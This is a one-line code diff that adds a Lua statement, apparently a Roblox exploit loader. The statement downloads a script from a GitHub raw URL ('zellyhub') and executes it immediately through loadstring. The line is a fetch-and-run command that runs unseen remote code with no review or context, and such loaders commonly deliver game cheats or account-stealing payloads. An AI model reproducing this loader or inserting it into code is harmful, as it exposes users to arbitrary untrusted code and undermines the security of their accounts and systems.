@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skiddie67/zellyhub/main/script.lua"))()
